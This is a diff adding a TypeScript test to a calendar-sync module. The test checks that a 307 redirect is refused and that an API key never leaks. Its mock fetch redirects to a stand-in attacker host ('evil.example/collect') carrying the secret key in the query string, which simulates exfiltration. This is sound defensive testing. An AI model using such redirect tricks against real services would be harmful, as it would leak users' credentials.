@@ -129,4 +129,37 @@ describe('calendrier hors ligne', () => {
     expect(result.sources.find((s) => s.sourceId === 'bls')?.state).toBe('stale');
     expect(result.sources.find((s) => s.sourceId === 'fed')?.state).toBe('stale');
   });
+
+  it('refuse une redirection 307 : le second hôte n’est jamais appelé', async () => {
+    const calls: string[] = [];
+    const evil = 'https://evil.example/collect';
+    const fetchImpl = async (url: string, init?: RequestInit): Promise<Response> => {
+      calls.push(url);
+      if (url.startsWith('https://evil.example')) return new Response('stolen', { status: 200 });
+      if (init?.redirect !== 'manual') return fetchImpl(evil, { redirect: 'manual' });
+      return new Response(null, { status: 307, headers: { Location: `${evil}?registrationkey=SECRETKEY99` } });
+    };
+    const result = await runCalendarSync({
+      range: { from: '2026-01-01', to: '2026-12-31' },
+      locale: 'fr',
+      now: 4_000,
+      hostOk: () => true,
+      byok: { bls: 'SECRETKEY99' },
+      adapters: [blsAdapter],
+      fetchImpl,
+      cache: {
+        async read() {
+          return null;
+        },
+        async write() {
+          /* pas de cache */
+        },
+      },
+    });
+    expect(calls.some((url) => url.startsWith('https://evil.example'))).toBe(false);
+    const bls = result.sources.find((s) => s.sourceId === 'bls');
+    expect(bls?.state).toBe('error');
+    expect(bls?.detail).toMatch(/[Rr]edirection/);
+    expect(JSON.stringify(result)).not.toContain('SECRETKEY99');
+  });
 });
